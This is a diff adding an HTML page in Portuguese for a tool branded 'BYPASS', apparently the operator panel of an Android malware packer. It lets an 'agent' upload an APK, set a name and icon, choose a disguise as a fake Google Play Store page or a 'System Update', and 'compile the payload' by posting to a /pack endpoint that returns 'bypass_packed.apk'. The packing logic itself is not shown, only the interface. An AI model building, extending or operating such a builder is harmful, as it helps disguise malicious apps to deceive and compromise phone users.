@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>BYPASS</title>
+<style>
+:root {
+  --bg:#080e1a;--sidebar:#060c18;--panel:#0c1526;--card:#0f1c30;
+  --input:#0a1422;--border:#1a2d45;--border2:#122038;--accent:#2979ff;
+  --accent2:#1565c0;--cyan:#00b4d8;--green:#00e676;--green-bg:rgba(0,230,118,.08);
+  --red:#f44336;--text:#e2eaf4;--sub:#4a6080;--sub2:#2a3f58;--active-bg:#0d2040;
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html,body{height:100%;overflow:hidden}
+body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;display:flex;font-size:13px}
+.sidebar{width:200px;min-width:200px;background:var(--sidebar);border-right:1px solid var(--border2);display:flex;flex-direction:column;height:100vh}
+.logo-block{padding:1.6rem 1.4rem 1.4rem;border-bottom:1px solid var(--border2)}
+.logo-icon{width:44px;height:44px;background:linear-gradient(135deg,#1565c0,#0d47a1);border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:1.3rem;margin-bottom:.7rem;box-shadow:0 4px 20px rgba(41,121,255,.3)}
+.logo-name{font-size:.85rem;font-weight:800;letter-spacing:.18em;color:#60b3ff}
+.nav{flex:1;padding:1rem 0;display:flex;flex-direction:column;gap:.2rem}
+.nav-item{display:flex;align-items:center;gap:.7rem;padding:.65rem 1.4rem;font-size:.75rem;font-weight:600;letter-spacing:.1em;color:var(--sub);cursor:pointer;border-left:3px solid transparent;transition:color .15s,background .15s;text-transform:uppercase}
+.nav-item:hover{color:var(--text);background:rgba(255,255,255,.03)}
+.nav-item.active{color:#60b3ff;background:var(--active-bg);border-left-color:var(--accent)}
+.nav-bottom{border-top:1px solid var(--border2);padding:.5rem 0}
+.main{flex:1;display:flex;flex-direction:column;height:100vh;overflow:hidden}
+.topbar{height:52px;min-height:52px;background:var(--sidebar);border-bottom:1px solid var(--border2);display:flex;align-items:center;padding:0 1.8rem;gap:.7rem}
+.topbar-title{font-size:.85rem;font-weight:700;letter-spacing:.15em;color:var(--text);text-transform:uppercase}
+.topbar-right{margin-left:auto;display:flex;align-items:center;gap:.8rem}
+.agent-label{font-size:.65rem;font-weight:600;letter-spacing:.1em;color:var(--sub);text-transform:uppercase}
+.agent-name{font-size:.75rem;font-weight:700;color:var(--cyan)}
+.op-btn{background:var(--accent);color:#fff;border:none;border-radius:5px;padding:.4rem .9rem;font-size:.7rem;font-weight:700;letter-spacing:.1em;cursor:pointer;text-transform:uppercase}
+.content{flex:1;overflow-y:auto;padding:2rem 2.2rem}
+.build-card{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:2rem;max-width:960px}
+.section-title{font-size:.7rem;font-weight:700;letter-spacing:.2em;color:var(--text);text-transform:uppercase;display:flex;align-items:center;gap:.5rem;margin-bottom:1.6rem;padding-bottom:1rem;border-bottom:1px solid var(--border2)}
+.field{margin-bottom:1.6rem}
+.label{font-size:.65rem;font-weight:700;letter-spacing:.15em;color:var(--sub);text-transform:uppercase;margin-bottom:.6rem;display:block}
+.visual-options{display:flex;flex-direction:column;gap:.5rem}
+.visual-opt{background:var(--input);border:1px solid var(--border);border-radius:7px;padding:.8rem 1rem;display:flex;align-items:center;gap:.8rem;cursor:pointer;transition:border-color .15s}
+.visual-opt:hover{border-color:var(--sub)}
+.visual-opt.selected{border-color:var(--green);background:var(--green-bg)}
+.visual-opt-icon{width:28px;height:28px;border-radius:6px;background:#01875f;display:flex;align-items:center;justify-content:center;font-size:.85rem;flex-shrink:0}
+.visual-opt-icon.sys{background:#1a237e}
+.visual-opt-name{font-size:.78rem;font-weight:700;color:var(--text);display:block}
+.visual-opt.selected .visual-opt-name{color:var(--green)}
+.visual-opt-sub{font-size:.65rem;color:var(--sub);text-transform:uppercase;letter-spacing:.08em;display:block}
+.check{margin-left:auto;width:16px;height:16px;border-radius:50%;border:2px solid var(--sub2);display:flex;align-items:center;justify-content:center;font-size:.6rem;flex-shrink:0}
+.visual-opt.selected .check{background:var(--green);border-color:var(--green);color:#000}
+.text-input{width:100%;background:var(--input);border:1px solid var(--border);border-radius:7px;padding:.75rem 1rem;font-family:inherit;font-size:.82rem;color:var(--text);outline:none;transition:border-color .15s}
+.text-input::placeholder{color:var(--sub)}
+.text-input:focus{border-color:var(--accent)}
+.drop-zone{background:var(--input);border:2px dashed var(--border);border-radius:8px;padding:3rem 1rem;text-align:center;cursor:pointer;position:relative;transition:border-color .2s,background .2s}
+.drop-zone.over{border-color:var(--accent);background:rgba(41,121,255,.06)}
+.drop-zone.has-file{border-color:var(--green);border-style:solid}
+.drop-zone input[type=file]{position:absolute;inset:0;opacity:0;cursor:pointer;width:100%;height:100%}
+.drop-icon{font-size:2.2rem;margin-bottom:.8rem;color:var(--accent)}
+.drop-label{font-size:.8rem;color:var(--sub)}
+.drop-fname{margin-top:.5rem;font-size:.75rem;color:var(--green);min-height:1em}
+.icon-row{background:var(--input);border:1px solid var(--border);border-radius:7px;padding:.75rem 1rem;display:flex;align-items:center;gap:1rem}
+.choose-btn{background:var(--accent);color:#fff;border:none;border-radius:5px;padding:.45rem .9rem;font-size:.72rem;font-weight:600;cursor:pointer;white-space:nowrap;flex-shrink:0}
+.icon-name{font-size:.78rem;color:var(--sub)}
+.compile-btn{display:flex;align-items:center;justify-content:center;gap:.6rem;width:100%;padding:1rem;background:linear-gradient(90deg,#1565c0,#2979ff);color:#fff;border:none;border-radius:8px;font-family:inherit;font-size:.85rem;font-weight:700;letter-spacing:.15em;text-transform:uppercase;cursor:pointer;transition:opacity .15s;box-shadow:0 4px 24px rgba(41,121,255,.3)}
+.compile-btn:hover:not(:disabled){opacity:.9}
+.compile-btn:disabled{opacity:.35;cursor:not-allowed}
+.progress-wrap{margin-top:1rem;height:3px;background:var(--border);border-radius:2px;overflow:hidden;display:none}
+.progress-wrap.show{display:block}
+.progress-bar{height:100%;background:linear-gradient(90deg,var(--accent),var(--cyan));width:30%;animation:sweep 1.3s infinite linear}
+@keyframes sweep{0%{transform:translateX(-200%)}100%{transform:translateX(500%)}}
+.status-msg{margin-top:.8rem;font-size:.75rem;text-align:center;min-height:1.1em;color:var(--sub)}
+.status-msg.ok{color:var(--green)}
+.status-msg.err{color:var(--red)}
+</style>
+</head>
+<body>
+<aside class="sidebar">
+  <div class="logo-block">
+    <div class="logo-icon">👻</div>
+    <div class="logo-name">BYPASS</div>
+  </div>
+  <nav class="nav">
+    <div class="nav-item"><span>›</span> Dashboard</div>
+    <div class="nav-item active"><span>▤</span> Build APK</div>
+    <div class="nav-item"><span>📁</span> Meus Builds</div>
+  </nav>
+  <div class="nav-bottom">
+    <div class="nav-item" style="color:var(--red)"><span>⏻</span> Desconectar</div>
+  </div>
+</aside>
+<div class="main">
+  <div class="topbar">
+    <span style="color:var(--sub)">⚙</span>
+    <span class="topbar-title">Build APK</span>
+    <div class="topbar-right">
+      <div><div class="agent-label">Agente Ativo</div><div class="agent-name">User06271</div></div>
+      <button class="op-btn">Operador</button>
+    </div>
+  </div>
+  <div class="content">
+    <div class="build-card">
+      <div class="section-title"><span style="color:#00b4d8">⚙</span> Configurar Geração de Payload</div>
+      <div class="field">
+        <label class="label">Visual do APK</label>
+        <div class="visual-options">
+          <div class="visual-opt selected" data-val="playstore" onclick="selectVisual(this)">
+            <div class="visual-opt-icon">▶</div>
+            <div><span class="visual-opt-name">Google Play Store</span><span class="visual-opt-sub">Página Fake</span></div>
+            <div class="check">✓</div>
+          </div>
+          <div class="visual-opt" data-val="system" onclick="selectVisual(this)">
+            <div class="visual-opt-icon sys">🔧</div>
+            <div><span class="visual-opt-name">System Update</span><span class="visual-opt-sub">Atualização do Sistema</span></div>
+            <div class="check"></div>
+          </div>
+        </div>
+      </div>
+      <div class="field">
+        <label class="label">Nome do App</label>
+        <input class="text-input" id="appName" type="text" placeholder="Ex: Update System" maxlength="64">
+      </div>
+      <div class="field">
+        <label class="label">Arquivo APK</label>
+        <div class="drop-zone" id="dropZone">
+          <input type="file" id="apkInput" accept=".apk">
+          <div class="drop-icon">📄</div>
+          <div class="drop-label">Arraste ou selecione o pacote (.apk)</div>
+          <div class="drop-fname" id="apkName"></div>
+        </div>
+      </div>
+      <div class="field">
+        <label class="label">Ícone Personalizado <span style="color:var(--sub);font-weight:400;text-transform:none;letter-spacing:0">(opcional)</span></label>
+        <div class="icon-row">
+          <button class="choose-btn" onclick="document.getElementById('iconInput').click()">Choose File</button>
+          <input type="file" id="iconInput" accept="image/png,image/jpeg" style="display:none">
+          <div class="icon-name" id="iconName">No file chosen</div>
+        </div>
+      </div>
+      <button class="compile-btn" id="compileBtn" disabled onclick="compile()">
+        <span>⚡</span> Compilar APK
+      </button>
+      <div class="progress-wrap" id="progWrap"><div class="progress-bar"></div></div>
+      <div class="status-msg" id="statusMsg"></div>
+    </div>
+  </div>
+</div>
+<script>
+let apkFile=null,iconFile=null,visual='playstore';
+function selectVisual(el){
+  document.querySelectorAll('.visual-opt').forEach(o=>{o.classList.remove('selected');o.querySelector('.check').textContent='';});
+  el.classList.add('selected');el.querySelector('.check').textContent='✓';visual=el.dataset.val;
+}
+const dropZone=document.getElementById('dropZone'),apkInput=document.getElementById('apkInput');
+apkInput.addEventListener('change',()=>{if(apkInput.files[0])setApk(apkInput.files[0]);});
+dropZone.addEventListener('dragover',e=>{e.preventDefault();dropZone.classList.add('over');});
+dropZone.addEventListener('dragleave',()=>dropZone.classList.remove('over'));
+dropZone.addEventListener('drop',e=>{
+  e.preventDefault();dropZone.classList.remove('over');
+  const f=e.dataTransfer.files[0];
+  if(f?.name.toLowerCase().endsWith('.apk'))setApk(f);else setStatus('err','arquivo deve ser .apk');
+});
+function setApk(f){apkFile=f;document.getElementById('apkName').textContent=`${f.name} (${(f.size/1024/1024).toFixed(1)} MB)`;dropZone.classList.add('has-file');document.getElementById('compileBtn').disabled=false;}
+document.getElementById('iconInput').addEventListener('change',function(){if(!this.files[0])return;iconFile=this.files[0];document.getElementById('iconName').textContent=iconFile.name;});
+async function compile(){
+  if(!apkFile)return;
+  document.getElementById('compileBtn').disabled=true;
+  document.getElementById('progWrap').classList.add('show');
+  setStatus('','compilando payload...');
+  const form=new FormData();
+  form.append('apk',apkFile);
+  const name=document.getElementById('appName').value.trim();
+  if(name)form.append('app_name',name);
+  if(iconFile)form.append('icon',iconFile);
+  form.append('visual',visual);
+  try{
+    const res=await fetch('/pack',{method:'POST',body:form});
+    if(!res.ok){const err=await res.json().catch(()=>({error:res.statusText}));throw new Error(err.error||res.statusText);}
+    const blob=await res.blob();
+    const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='bypass_packed.apk';a.click();
+    setStatus('ok','✓ APK compilado e baixado');
+  }catch(e){setStatus('err','✗ '+e.message);}
+  finally{document.getElementById('progWrap').classList.remove('show');document.getElementById('compileBtn').disabled=false;}
+}
+function setStatus(cls,msg){const el=document.getElementById('statusMsg');el.className='status-msg'+(cls?' '+cls:'');el.textContent=msg;}
+</script>
+</body>
+</html>
